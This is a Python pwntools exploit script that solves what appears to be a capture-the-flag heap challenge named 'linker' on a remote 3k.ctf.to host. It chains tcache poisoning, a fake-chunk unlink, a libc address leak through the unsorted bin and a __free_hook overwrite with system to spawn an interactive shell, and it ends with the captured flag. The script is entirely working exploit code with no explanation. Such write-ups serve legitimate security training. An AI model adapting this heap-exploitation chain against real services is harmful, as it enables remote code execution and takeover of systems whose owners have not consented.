from pwn import *


# Util
def create(size):
    r.sendlineafter('> ', '0001' + str(size))


def edit(idx, data):
    r.sendlineafter('> ', b'0002000' + str(idx).encode() + data)


def delete(idx):
    r.sendlineafter('> ', '0003' + str(idx))


def editname(data):
    r.sendafter('> ', b'0004' + data)
    return r.recvuntil('! What', drop=True).split(b'Welcome ')[1]


# Addr
page_size = 0x6020c0
name_buf = 0x602130
name_size = 0x602148
main_arena_offset = 0x3ebc40
unsorted_bin_offset = main_arena_offset + 0x60
system_offset = 0x4f4e0
free_hook_offset = 0x3ed8e8

# Main
elf = ELF("linker")
libc = ELF("libc-2.27.so")
HOST = "linker.3k.ctf.to"
PORT = 9654
r = remote(HOST, PORT)

r.sendlineafter('size:\n', '8')
r.sendafter('name:\n', 'M30W')

log.info("tcache...")
for i in range(7):
    create(0x68)  # 0
    delete(0)
log.info("tcache done")

create(0x68)  # 0
delete(0)
edit(0, p64(page_size))

log.info("news...")
create(0x68)  # 0
create(0)  # 1
create(0x71)  # 2
create(0)  # 3
create(0x68)  # 4
log.info("news done")

log.info("unlink...")
edit(4, p64(0x68) + p64(0) + p64(1) + p64(0) + p64(1) + p64(0) + p64(name_buf - 0x8))
edit(0, p64(0x421))
edit(4, p64(0x68) + p64(0) + p64(1) + p64(0) + p64(1) + p64(0) + p64(name_buf + 0x418))
edit(0, p64(0x21) + b'\x00' * 0x18 + p64(0x21))
edit(4, p64(0x68) + p64(0) + p64(1) + p64(0) + p64(1) + p64(0) + p64(name_buf))
delete(0)
edit(4, p64(0x68) + p64(0) + p64(1) + p64(0) + p64(1) + p64(0) + p64(name_size))
edit(0, p64(0x8))
log.info("unlink done")

log.info("leaking libc base...")
unsorted_bin_addr = u64(editname(b'\xa0') + b'\x00\x00')
libc_base = unsorted_bin_addr - unsorted_bin_offset
log.success("libc base --> %s" % hex(libc_base))

edit(4, p64(0x68) + p64(0) + p64(1) + p64(0) + p64(1) + p64(0) + p64(libc_base + free_hook_offset - 0x8))
edit(0, b'/bin/sh\x00' + p64(libc_base + system_offset))
delete(0)
log.success("spawning shell...")
sleep(1)
r.recvuntil("turned off\n")
r.interactive()

# FLAG --> 3k{unlink_the_world_and_feel_the_void}
